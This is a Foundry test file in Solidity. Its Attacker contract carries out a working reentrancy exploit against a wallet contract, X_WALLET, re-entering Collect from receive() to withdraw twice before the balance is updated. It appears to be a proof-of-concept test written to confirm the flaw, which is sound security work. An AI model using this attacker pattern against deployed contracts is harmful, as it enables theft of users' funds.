
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/X_WALLET.sol";

contract TestReentrancyX_WALLET is Test {
    X_WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new X_WALLET(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // MinSum is 1 ether. We need to deposit at least that much to pass the check in Collect.
        // We constrain the upper bound to avoid overflow issues in setup, though 0.8.x handles it.
        vm.assume(attackVal >= 1 ether && attackVal < type(uint64).max);
        
        // Ensure attackVal is even to allow clean division for the split attack
        if (attackVal % 2 != 0) attackVal++;

        // Fund the victim contract to ensure it has enough ETH to pay out (even though we are withdrawing our own funds)
        vm.deal(address(_contractUnderTest), attackVal * 10);
        
        // Fund the test contract so it can fund the attacker
        vm.deal(address(this), attackVal * 2);

        // Setup: Deposit the full attackVal into the wallet
        _attacker.setupAttack{value: attackVal}(attackVal);

        // Time travel: Put(0) sets unlockTime to block.timestamp.
        // Collect requires block.timestamp > unlockTime.
        vm.warp(block.timestamp + 100);

        // Attack: Try to withdraw half the amount twice via reentrancy.
        // If attackVal is between 1 and 2 ether, the second withdrawal would normally fail 
        // because the remaining balance would be < MinSum. Reentrancy bypasses this check.
        _attacker.attack(attackVal / 2);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    X_WALLET public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = X_WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        // Deposit funds. Passing 0 sets unlockTime to block.timestamp
        _victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        storedAttackVal = val;
        
        // Call the vulnerable function
        _victim.Collect(val);

        // If we managed to re-enter and increment the count, the exploit succeeded
        if (attackCallCount >= 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            // Re-enter the contract.
            // Because state (balance) is updated AFTER the call in X_WALLET,
            // the balance check (acc.balance >= _am) passes again using the old balance.
            _victim.Collect(storedAttackVal);
        }
    }
}
